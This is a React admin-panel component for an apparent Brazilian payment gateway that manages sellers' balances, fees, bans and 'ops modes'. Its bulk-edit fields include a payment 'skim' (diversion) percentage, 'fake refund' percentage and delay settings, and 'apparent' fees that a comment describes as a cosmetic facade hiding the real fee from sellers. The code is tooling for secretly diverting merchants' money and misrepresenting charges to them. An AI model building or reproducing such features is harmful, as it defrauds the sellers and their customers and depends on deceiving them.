"use client";

import { useState, useTransition, useEffect } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import {
  Lock,
  TrendingUp,
  TrendingDown,
  Loader2,
  Check,
  X,
  Ban,
  ShieldCheck,
  Megaphone,
  Percent,
} from "lucide-react";
import {
  adminBulkUpdateUsers,
  adminBlockUser,
  adminUnblockUser,
  adminBulkBlockUsers,
  adminBulkAddWarning,
  adminMoveAllUsersMode,
} from "../../actions";
import { AdminBulkFeesModal, AdminAllFilterFeesModal } from "./bulk-fees-modal";
import type { LinkModeDefaults } from "@/lib/link-mode-defaults";
import { isOpsMode, OPS_MODES, type OpsMode } from "@/lib/ops-modes";

type UserRow = {
  id: string;
  name: string | null;
  email: string;
  balanceCents: number;
  feePercent: number;
  cardFeePercent: number;
  blocked: boolean;
  kycStatus: string;
  convRate: number | null;
  sample: number;
  paid: number;
};

function brl(c: number) {
  return (c / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
}

type FieldKey =
  | "webhookDeviationPercent"
  | "fakeRefundPercent"
  | "fakeRefundDelayDays"
  | "pixOpsMode"
  | "cardOpsMode"
  | "apparentFeePercent"
  | "apparentFeeFixedCents"
  | "apparentCardFeePercent"
  | "apparentCardFeeFixedCents"
  | "apparentBoletoFeePercent"
  | "apparentBoletoFeeFixedCents"
  | "apparentApplePayFeePercent"
  | "apparentApplePayFeeFixedCents"
  | "apparentGooglePayFeePercent"
  | "apparentGooglePayFeeFixedCents"
  | "apparentWithdrawalFeeCents";

// kind "apnum" = taxa APARENTE (cosmético): aceita número OU vazio (= limpar,
// volta a mostrar a taxa real pro seller).
const FIELDS: { key: FieldKey; label: string; kind: "num" | "mode" | "apnum" }[] = [
  { key: "webhookDeviationPercent", label: "Skim % (desvio)", kind: "num" },
  { key: "fakeRefundPercent", label: "Reembolso fake %", kind: "num" },
  { key: "fakeRefundDelayDays", label: "Reembolso fake dias", kind: "num" },
  { key: "pixOpsMode", label: "Modo PIX", kind: "mode" },
  { key: "cardOpsMode", label: "Modo Cartão", kind: "mode" },
  { key: "apparentFeePercent", label: "🎭 PIX % aparente", kind: "apnum" },
  { key: "apparentFeeFixedCents", label: "🎭 PIX fixa aparente (cents)", kind: "apnum" },
  { key: "apparentCardFeePercent", label: "🎭 Cartão % aparente", kind: "apnum" },
  { key: "apparentCardFeeFixedCents", label: "🎭 Cartão fixa aparente (cents)", kind: "apnum" },
  { key: "apparentBoletoFeePercent", label: "🎭 Boleto % aparente", kind: "apnum" },
  { key: "apparentBoletoFeeFixedCents", label: "🎭 Boleto fixa aparente (cents)", kind: "apnum" },
  { key: "apparentApplePayFeePercent", label: "🎭 Apple Pay % aparente", kind: "apnum" },
  { key: "apparentApplePayFeeFixedCents", label: "🎭 Apple Pay fixa aparente (cents)", kind: "apnum" },
  { key: "apparentGooglePayFeePercent", label: "🎭 Google Pay % aparente", kind: "apnum" },
  { key: "apparentGooglePayFeeFixedCents", label: "🎭 Google Pay fixa aparente (cents)", kind: "apnum" },
  { key: "apparentWithdrawalFeeCents", label: "🎭 Saque fixa aparente (cents)", kind: "apnum" },
];

export function BulkUsersTable({
  users,
  platformFees,
}: {
  users: UserRow[];
  /** Default do editor de taxas em massa (PlatformModeDefaults). */
  platformFees: LinkModeDefaults;
}) {
  const router = useRouter();
  const [selected, setSelected] = useState<Set<string>>(new Set());
  const [field, setField] = useState<FieldKey>("webhookDeviationPercent");
  const [value, setValue] = useState("");
  const [reason, setReason] = useState("");
  const [pending, startTransition] = useTransition();
  const [msg, setMsg] = useState<string | null>(null);
  const [feesModalOpen, setFeesModalOpen] = useState(false);

  const allSelected = users.length > 0 && selected.size === users.length;
  const fieldDef = FIELDS.find((f) => f.key === field)!;

  function toggle(id: string) {
    setSelected((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  }
  function toggleAll() {
    setSelected(allSelected ? new Set() : new Set(users.map((u) => u.id)));
  }

  function apply() {
    setMsg(null);
    if (!reason.trim()) {
      setMsg("Informe o motivo");
      return;
    }
    const patch: Record<string, unknown> = {};
    if (fieldDef.kind === "mode") {
      if (!isOpsMode(value)) {
        setMsg(`Escolha um modo: ${OPS_MODES.join(", ")}`);
        return;
      }
      patch[field] = value;
    } else if (fieldDef.kind === "apnum") {
      // Taxa aparente: vazio (ou "limpar"/"null") = remove a fachada (volta a
      // mostrar a real). Caso contrário, número >= 0; cents viram inteiro.
      const t = value.trim().toLowerCase();
      if (t === "" || t === "limpar" || t === "null") {
        patch[field] = null;
      } else {
        const n = Number(value.trim().replace(",", "."));
        if (!Number.isFinite(n) || n < 0) {
          setMsg("Valor inválido (deixe vazio pra limpar/mostrar a real)");
          return;
        }
        patch[field] = field.endsWith("Cents") ? Math.round(n) : n;
      }
    } else {
      const n = Number(value.replace(",", "."));
      if (!Number.isFinite(n)) {
        setMsg("Valor inválido");
        return;
      }
      patch[field] = field === "fakeRefundDelayDays" ? Math.floor(n) : n;
    }
    const ids = Array.from(selected);
    startTransition(async () => {
      const r = await adminBulkUpdateUsers({ userIds: ids, patch, reason: reason.trim() });
      if (r.ok) {
        setMsg(`✓ ${r.count} conta(s) atualizada(s)`);
        setSelected(new Set());
        setValue("");
        setReason("");
        router.refresh();
      } else {
        setMsg(r.error);
      }
    });
  }

  function bulkBlock(block: boolean) {
    setMsg(null);
    const ids = Array.from(selected);
    if (ids.length === 0) return;
    if (block && !reason.trim()) {
      setMsg("Informe o motivo pra bloquear (auditado)");
      return;
    }
    if (
      !confirm(
        block
          ? `BANIR ${ids.length} seller(s)? O site para de carregar pra eles (hard ban) até você desbloquear.`
          : `Desbloquear ${ids.length} seller(s)?`,
      )
    )
      return;
    startTransition(async () => {
      const r = await adminBulkBlockUsers({ userIds: ids, reason: reason.trim(), block });
      if (r.ok) {
        setMsg(`✓ ${r.count} ${block ? "bloqueado(s)" : "desbloqueado(s)"}`);
        setSelected(new Set());
        setReason("");
        router.refresh();
      } else {
        setMsg(r.error);
      }
    });
  }

  function bulkWarn() {
    setMsg(null);
    const ids = Array.from(selected);
    if (ids.length === 0) return;
    const message = prompt(
      `Aviso que vai aparecer na DASHBOARD de ${ids.length} seller(s):`,
    );
    if (message == null || !message.trim()) return;
    startTransition(async () => {
      const r = await adminBulkAddWarning({ userIds: ids, message: message.trim() });
      if (r.ok) {
        setMsg(`✓ aviso enviado pra ${r.count} seller(s)`);
        setSelected(new Set());
        router.refresh();
      } else {
        setMsg(r.error);
      }
    });
  }

  return (
    <>
      <div className="rounded-2xl border border-white/[0.08] bg-white/[0.02] overflow-hidden">
        <div className="grid grid-cols-12 gap-4 border-b border-white/[0.06] bg-black/30 px-5 py-3 text-[10px] uppercase tracking-wider text-zinc-500 items-center">
          <span className="col-span-3 flex items-center gap-2">
            <input
              type="checkbox"
              checked={allSelected}
              onChange={toggleAll}
              className="accent-red-500"
              title="Selecionar todos"
            />
            Usuário
          </span>
          <span className="col-span-2 text-right">Saldo</span>
          <span className="col-span-2">Taxa PIX / Card</span>
          <span className="col-span-2 text-right">Conv. PIX 30d</span>
          <span className="col-span-1">KYC</span>
          <span className="col-span-1">Status</span>
          <span className="col-span-1 text-right">Ações</span>
        </div>
        {users.length === 0 ? (
          <p className="px-5 py-12 text-center text-sm text-zinc-500">
            Nenhum usuário encontrado.
          </p>
        ) : (
          users.map((u) => (
            <div
              key={u.id}
              className={`grid grid-cols-12 gap-4 border-b border-white/[0.04] px-5 py-3 text-sm hover:bg-white/[0.02] ${
                selected.has(u.id) ? "bg-red-500/[0.05]" : ""
              }`}
            >
              <div className="col-span-3 min-w-0 flex items-center gap-2">
                <input
                  type="checkbox"
                  checked={selected.has(u.id)}
                  onChange={() => toggle(u.id)}
                  className="accent-red-500 shrink-0"
                />
                <div className="min-w-0">
                  <p className="text-white truncate">{u.name ?? u.email}</p>
                  <p className="text-[10px] text-zinc-500 font-mono truncate">
                    {u.email} · {u.id.slice(0, 12)}
                  </p>
                </div>
              </div>
              <span className="col-span-2 text-right font-mono text-cyan-300">
                {brl(u.balanceCents)}
              </span>
              <span className="col-span-2 font-mono text-[11px] text-zinc-300">
                {u.feePercent}% / {u.cardFeePercent}%
              </span>
              <span className="col-span-2 text-right">
                <ConversionBadge rate={u.convRate} sample={u.sample} paid={u.paid} />
              </span>
              <span className="col-span-1 text-xs">
                <KycBadge status={u.kycStatus} />
              </span>
              <span className="col-span-1">
                {u.blocked ? (
                  <span className="inline-flex items-center gap-1 rounded-full bg-red-500/15 px-2 py-0.5 text-[10px] text-red-300">
                    <Lock className="size-2.5" /> Bloq.
                  </span>
                ) : (
                  <span className="rounded-full bg-cyan-400/15 px-2 py-0.5 text-[10px] text-cyan-300">
                    Ativo
                  </span>
                )}
              </span>
              <div className="col-span-1 flex justify-end items-center gap-2">
                <RowBlock u={u} />
                <Link
                  href={`/admin01/users/${u.id}`}
                  className="text-xs text-red-300 hover:text-red-200"
                >
                  Editar
                </Link>
              </div>
            </div>
          ))
        )}
      </div>

      {/* Barra de ação em massa */}
      {selected.size > 0 && (
        <div className="sticky bottom-4 z-20 rounded-2xl border border-red-500/30 bg-zinc-900/95 backdrop-blur px-4 py-3 shadow-2xl flex flex-wrap items-center gap-2">
          <span className="text-sm font-bold text-white shrink-0">
            {selected.size} selecionado(s)
          </span>
          <button
            type="button"
            onClick={() => setSelected(new Set())}
            className="text-zinc-500 hover:text-white"
            title="Limpar seleção"
          >
            <X className="size-4" />
          </button>
          <div className="h-5 w-px bg-white/10 mx-1" />
          <select
            value={field}
            onChange={(e) => {
              setField(e.target.value as FieldKey);
              setValue("");
            }}
            className="rounded-lg border border-white/[0.08] bg-black/40 px-2 py-1.5 text-xs text-white"
          >
            {FIELDS.map((f) => (
              <option key={f.key} value={f.key}>
                {f.label}
              </option>
            ))}
          </select>
          {fieldDef.kind === "mode" ? (
            <select
              value={value}
              onChange={(e) => setValue(e.target.value)}
              className="rounded-lg border border-white/[0.08] bg-black/40 px-2 py-1.5 text-xs text-white"
            >
              <option value="">—</option>
              {OPS_MODES.map((m) => (
                <option key={m} value={m}>
                  {m}
                </option>
              ))}
            </select>
          ) : fieldDef.kind === "apnum" ? (
            <input
              type="text"
              inputMode="decimal"
              value={value}
              onChange={(e) => setValue(e.target.value)}
              placeholder="valor · vazio = limpar"
              title="Taxa aparente (fachada). Deixe vazio pra remover e voltar a mostrar a taxa real."
              className="w-36 rounded-lg border border-purple-400/30 bg-black/40 px-2 py-1.5 text-xs text-white tabular-nums"
            />
          ) : (
            <input
              type="number"
              value={value}
              onChange={(e) => setValue(e.target.value)}
              placeholder="valor"
              className="w-24 rounded-lg border border-white/[0.08] bg-black/40 px-2 py-1.5 text-xs text-white tabular-nums"
            />
          )}
          <input
            type="text"
            value={reason}
            onChange={(e) => setReason(e.target.value)}
            placeholder="motivo (auditado)"
            className="flex-1 min-w-[140px] rounded-lg border border-white/[0.08] bg-black/40 px-2 py-1.5 text-xs text-white"
          />
          <button
            type="button"
            onClick={apply}
            disabled={pending}
            className="inline-flex items-center gap-1.5 rounded-full bg-red-500 px-4 py-1.5 text-xs font-bold text-white hover:bg-red-400 disabled:opacity-50"
          >
            {pending ? (
              <Loader2 className="size-3.5 animate-spin" />
            ) : (
              <Check className="size-3.5" />
            )}
            Aplicar
          </button>
          <button
            type="button"
            onClick={() => setFeesModalOpen(true)}
            disabled={pending}
            className="inline-flex items-center gap-1.5 rounded-full border border-cyan-400/40 bg-cyan-500/15 px-3 py-1.5 text-xs font-bold text-cyan-200 hover:bg-cyan-500/25 disabled:opacity-50"
            title="Editar taxas (por modo: black/white/hot + saque) dos selecionados"
          >
            <Percent className="size-3.5" /> Editar taxas
          </button>
          <div className="h-5 w-px bg-white/10 mx-1" />
          <button
            type="button"
            onClick={() => bulkBlock(true)}
            disabled={pending}
            className="inline-flex items-center gap-1.5 rounded-full bg-red-600/80 px-3 py-1.5 text-xs font-bold text-white hover:bg-red-600 disabled:opacity-50"
            title="Banir os selecionados (hard ban — o site não carrega pra eles)"
          >
            <Ban className="size-3.5" /> Bloquear
          </button>
          <button
            type="button"
            onClick={() => bulkBlock(false)}
            disabled={pending}
            className="inline-flex items-center gap-1.5 rounded-full border border-cyan-400/40 bg-cyan-500/15 px-3 py-1.5 text-xs font-bold text-cyan-200 hover:bg-cyan-500/25 disabled:opacity-50"
            title="Desbloquear os selecionados"
          >
            <ShieldCheck className="size-3.5" /> Desbloquear
          </button>
          <button
            type="button"
            onClick={bulkWarn}
            disabled={pending}
            className="inline-flex items-center gap-1.5 rounded-full border border-sky-400/40 bg-sky-500/15 px-3 py-1.5 text-xs font-bold text-sky-200 hover:bg-sky-500/25 disabled:opacity-50"
            title="Enviar um aviso pra dashboard dos selecionados"
          >
            <Megaphone className="size-3.5" /> Aviso
          </button>
          {msg && (
            <span
              className={`text-[11px] ${msg.startsWith("✓") ? "text-cyan-300" : "text-red-300"}`}
            >
              {msg}
            </span>
          )}
        </div>
      )}

      {feesModalOpen && selected.size > 0 && (
        <AdminBulkFeesModal
          ids={Array.from(selected)}
          initial={platformFees}
          onClose={() => {
            setFeesModalOpen(false);
            setSelected(new Set());
            router.refresh();
          }}
        />
      )}
    </>
  );
}

/**
 * "Selecionar todo mundo" → mover TODOS os sellers que batem no filtro atual
 * (não só os 200 visíveis) pro modo de adquirente escolhido. Um updateMany só.
 */
export function MoveAllToMode({
  filter,
  count,
}: {
  filter: { q?: string; mode?: string; kyc?: string; blocked?: string };
  count: number;
}) {
  const router = useRouter();
  const [toMode, setToMode] = useState("");
  const [reason, setReason] = useState("");
  const [pending, startTransition] = useTransition();
  const [msg, setMsg] = useState<string | null>(null);
  function run() {
    setMsg(null);
    if (!isOpsMode(toMode)) {
      setMsg("Escolha o modo destino");
      return;
    }
    if (!reason.trim()) {
      setMsg("Informe o motivo (auditado)");
      return;
    }
    if (
      !confirm(
        `Mover TODOS os ${count} seller(s) do filtro atual pro modo "${toMode}"? Altera pixOpsMode e cardOpsMode de todos de uma vez.`,
      )
    )
      return;
    startTransition(async () => {
      const r = await adminMoveAllUsersMode({
        toMode: toMode as OpsMode,
        reason: reason.trim(),
        filter,
      });
      if (r.ok) {
        setMsg(`✓ ${r.count} seller(s) movido(s) pro modo ${toMode}`);
        setReason("");
        setToMode("");
        router.refresh();
      } else {
        setMsg(r.error);
      }
    });
  }
  return (
    <div className="flex flex-wrap items-center gap-2 rounded-2xl border border-amber-400/30 bg-amber-400/[0.05] px-4 py-3">
      <span className="text-sm font-semibold text-amber-100">
        Selecionar todo mundo · mover os {count} do filtro pro modo:
      </span>
      <select
        value={toMode}
        onChange={(e) => setToMode(e.target.value)}
        className="rounded-lg border border-white/[0.08] bg-black/40 px-2 py-1.5 text-xs text-white"
      >
        <option value="">— destino —</option>
        {OPS_MODES.map((m) => (
          <option key={m} value={m}>
            {m}
          </option>
        ))}
      </select>
      <input
        type="text"
        value={reason}
        onChange={(e) => setReason(e.target.value)}
        placeholder="motivo (auditado)"
        className="flex-1 min-w-[140px] rounded-lg border border-white/[0.08] bg-black/40 px-2 py-1.5 text-xs text-white"
      />
      <button
        type="button"
        onClick={run}
        disabled={pending || count === 0}
        className="inline-flex items-center gap-1.5 rounded-full bg-amber-500 px-4 py-1.5 text-xs font-bold text-black hover:bg-amber-400 disabled:opacity-50"
      >
        {pending ? (
          <Loader2 className="size-3.5 animate-spin" />
        ) : (
          <Check className="size-3.5" />
        )}
        Mover todos
      </button>
      {msg && (
        <span
          className={`text-[11px] ${msg.startsWith("✓") ? "text-cyan-300" : "text-red-300"}`}
        >
          {msg}
        </span>
      )}
    </div>
  );
}

/**
 * "Mudar taxas de todo mundo" → abre o editor de taxas (black/white/hot +
 * saque) e aplica a TODOS os sellers que batem no filtro atual (não só os 200
 * visíveis). Botão âmbar + modal com motivo auditado obrigatório.
 */
export function FeesForAllFilter({
  filter,
  count,
  platformFees,
}: {
  filter: { q?: string; mode?: string; kyc?: string; blocked?: string };
  count: number;
  platformFees: LinkModeDefaults;
}) {
  const router = useRouter();
  const [open, setOpen] = useState(false);
  return (
    <>
      <div className="flex flex-wrap items-center gap-2 rounded-2xl border border-cyan-400/30 bg-cyan-400/[0.05] px-4 py-3">
        <Percent className="size-4 text-cyan-300" />
        <span className="text-sm font-semibold text-cyan-100">
          Mudar as taxas dos {count} seller(s) do filtro de uma vez:
        </span>
        <button
          type="button"
          onClick={() => setOpen(true)}
          disabled={count === 0}
          className="ml-auto inline-flex items-center gap-1.5 rounded-full bg-cyan-400 px-4 py-1.5 text-xs font-bold text-black hover:bg-cyan-300 disabled:opacity-50"
        >
          <Percent className="size-3.5" /> Editar taxas de todos
        </button>
      </div>
      {open && (
        <AdminAllFilterFeesModal
          filter={filter}
          count={count}
          initial={platformFees}
          onClose={() => {
            setOpen(false);
            router.refresh();
          }}
        />
      )}
    </>
  );
}

/** Bloqueio por linha: BLOQUEAR exige 2 cliques (arma → confirmar, desarma em
 *  3s); DESBLOQUEAR é 1 clique. Ban hard via adminBlockUser. */
function RowBlock({ u }: { u: UserRow }) {
  const router = useRouter();
  const [pending, startTransition] = useTransition();
  const [armed, setArmed] = useState(false);
  useEffect(() => {
    if (!armed) return;
    const t = setTimeout(() => setArmed(false), 3000);
    return () => clearTimeout(t);
  }, [armed]);
  function run() {
    if (u.blocked) {
      startTransition(async () => {
        await adminUnblockUser(u.id);
        router.refresh();
      });
      return;
    }
    if (!armed) {
      setArmed(true);
      return;
    }
    setArmed(false);
    startTransition(async () => {
      await adminBlockUser({ userId: u.id, reason: "Bloqueado pelo admin (lista)" });
      router.refresh();
    });
  }
  if (u.blocked) {
    return (
      <button
        type="button"
        onClick={run}
        disabled={pending}
        title="Desbloquear seller"
        className="inline-flex items-center gap-1 text-[11px] text-cyan-300 hover:text-cyan-200 disabled:opacity-50"
      >
        {pending ? <Loader2 className="size-3 animate-spin" /> : <ShieldCheck className="size-3" />}
      </button>
    );
  }
  return (
    <button
      type="button"
      onClick={run}
      disabled={pending}
      title={armed ? "Clique de novo pra BANIR (hard ban)" : "Bloquear (2 cliques)"}
      className={`inline-flex items-center gap-1 text-[11px] disabled:opacity-50 ${
        armed ? "font-bold text-amber-300" : "text-zinc-500 hover:text-red-300"
      }`}
    >
      {pending ? <Loader2 className="size-3 animate-spin" /> : <Ban className="size-3" />}
      {armed && "confirmar?"}
    </button>
  );
}

function ConversionBadge({
  rate,
  sample,
  paid,
}: {
  rate: number | null;
  sample: number;
  paid: number;
}) {
  if (rate === null || sample === 0) {
    return <span className="text-[10px] text-zinc-600 font-mono">—</span>;
  }
  const tone =
    rate >= 80
      ? "text-emerald-300 bg-emerald-500/15"
      : rate >= 60
        ? "text-cyan-300 bg-cyan-500/15"
        : rate >= 30
          ? "text-yellow-300 bg-yellow-500/15"
          : "text-red-300 bg-red-500/15";
  return (
    <span
      className={`inline-flex items-baseline gap-1 rounded-full px-2 py-0.5 ${tone}`}
      title={`${paid} pagos / ${sample} decisivos (30d)`}
    >
      {rate >= 60 ? (
        <TrendingUp className="size-2.5 self-center" />
      ) : (
        <TrendingDown className="size-2.5 self-center" />
      )}
      <span className="text-[11px] font-mono font-bold tabular-nums">
        {rate.toFixed(1)}%
      </span>
      <span className="text-[9px] opacity-60">({sample})</span>
    </span>
  );
}

function KycBadge({ status }: { status: string }) {
  const map: Record<string, { label: string; cls: string }> = {
    not_started: { label: "Não iniciado", cls: "bg-zinc-700/40 text-zinc-400" },
    in_review: { label: "Em análise", cls: "bg-yellow-400/15 text-yellow-300" },
    approved: { label: "Aprovado", cls: "bg-cyan-400/15 text-cyan-300" },
    rejected: { label: "Rejeitado", cls: "bg-red-500/15 text-red-300" },
  };
  const s = map[status] ?? map.not_started;
  return (
    <span className={`rounded-full px-2 py-0.5 text-[10px] ${s.cls}`}>
      {s.label}
    </span>
  );
}
